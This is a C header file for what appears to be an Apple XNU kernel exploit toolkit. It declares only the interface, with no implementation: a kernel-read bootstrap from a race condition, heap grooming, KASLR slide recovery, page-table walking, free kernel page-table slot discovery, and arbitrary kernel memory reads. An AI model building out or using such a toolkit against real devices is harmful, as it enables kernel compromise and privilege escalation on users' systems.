#ifndef KREAD_BOOTSTRAP_H
#define KREAD_BOOTSTRAP_H

#include <stdint.h>
#include <stddef.h>
#include <mach/mach.h>

int  kread_bootstrap(void);
void kread_bootstrap_cleanup(void);
int  kread_bootstrap_is_established(void);

void        kread_bootstrap_open_log(void);
void        kread_bootstrap_log_write(const void *buf, int len);
const char *kread_bootstrap_get_log(void);
const char *kread_bootstrap_get_log_path(void);
void        kread_bootstrap_set_ui_log_callback(void (*cb)(const char *line, int len));
int         kread_bootstrap_log_is_fresh(void);
void        kread_bootstrap_clear_log(void);

int      kread_bootstrap_get_raced_count(void);
uint64_t kread_bootstrap_get_raced_obj_id(int i);
uint64_t kread_bootstrap_get_raced_base(int i);
uint32_t kread_bootstrap_get_raced_delta(int i);

uint64_t kva_to_pa(uint64_t kva);
uint64_t pte_scan_for_physaddr(uint64_t target_pa);
int      kread_walk_pte(uint64_t kva, uint64_t *out_pte_kva, uint64_t *out_pte_value, int *out_level);
int      kernel_pte_walk_full(uint64_t kva, uint64_t *out_leaf_pte_kva,
                              uint64_t *out_leaf_pte_val, uint64_t *out_page_pa);
int      find_free_kernel_l2_slot(uint64_t witness_kva, uint64_t *out_l1_pa, uint64_t *out_free_off,
                                  uint64_t *out_window_va, uint64_t *out_l1_table_kva);
uint64_t kread_get_our_proc(void);

uint64_t kwrite_get_kaslr_slide(void);
uint64_t kwrite_get_found_kptr_base(void);
uint64_t kwrite_get_kern_task_kva(void);

kern_return_t kwrite_kread32(uint64_t kaddr, uint32_t *out);
kern_return_t kwrite_kread64(uint64_t kaddr, uint64_t *out);

uint8_t  *kwrite_get_groom_elem(void);
uint32_t  kwrite_get_mem_entry_port(void);
uint64_t  kwrite_get_page_mask(void);

#endif
